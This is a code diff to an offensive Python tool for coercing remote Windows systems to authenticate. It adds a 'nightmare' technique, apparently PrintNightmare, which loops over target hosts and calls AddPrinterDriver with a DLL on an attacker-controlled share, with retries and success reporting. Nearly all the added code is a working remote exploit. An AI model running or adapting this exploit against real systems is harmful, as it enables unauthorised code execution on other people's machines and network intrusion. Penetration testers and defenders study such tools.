@@ -185,6 +185,7 @@ def generate_targets(target):
 
 def main():
 	parser = argparse.ArgumentParser(add_help=True, description='Coerce remote systems to authenticate', formatter_class=argparse.RawDescriptionHelpFormatter)
+	parser.add_argument('technique', action='store', help='attack technique to execute', choices=['spooler', 'nightmare'])
 	parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
 	parser.add_argument('--share', action='store', required=False, default=None, help='path to DLL (ex: \'\\\\10.1.10.199\\share\\Program.dll\')')
 	parser.add_argument('--lhost', action='store', required=False, default=None, help='listening hostname or IP')
@@ -227,6 +228,7 @@ def main():
 		print("[-] Please specify an IP address or hostname with the --lhost parameter")
 		return
 
+	if args.technique == 'spooler':
 		for rhost in generate_targets(address):
 			print(f"[*] {rhost}...", end='', flush=True)
 
@@ -259,6 +261,52 @@ def main():
 					print(f'exploited')
 				else:
 					print(f'exploited (printer changed, may need cleanup)')
+
+			else:
+				print(f'port closed')
+				continue
+
+	elif args.technique == 'nightmare':
+		for rhost in generate_targets(address):
+			print(f"[*] {rhost}...", end='', flush=True)
+
+			if tcp_port_open(rhost, args.port, timeout=1):
+				attempts = 1
+				success = False
+
+				while (attempts <= 3) and (success is False):
+					print(f"attempt {attempts}...", end='', flush=True)
+
+					dce = DcePrinterPwn()
+					dce.rhost = rhost
+					dce.rport = args.port
+					dce.lshare = args.share
+					dce.domain = domain
+					dce.user = username
+					dce.passwd = password
+					dce.nthash = nthash
+					dce.lmhash = lmhash
+
+					# Go to next target if connection failed
+					if dce.connect() is False:
+						attempts = 4
+
+					# Go to next target if enum drivers failed
+					if dce.call_enum_printer_drivers() is False:
+						attempts = 4
+
+					# Break from loop if successful
+					if dce.call_add_printer_driver() is True:
+						success = True
+
+					else:
+						sleep(10)
+						attempts += 1
+
+				if success is True:
+					print(f'exploit success')
+				else:
+					print(f'exploit failed')
 
 			else:
 				print(f'port closed')
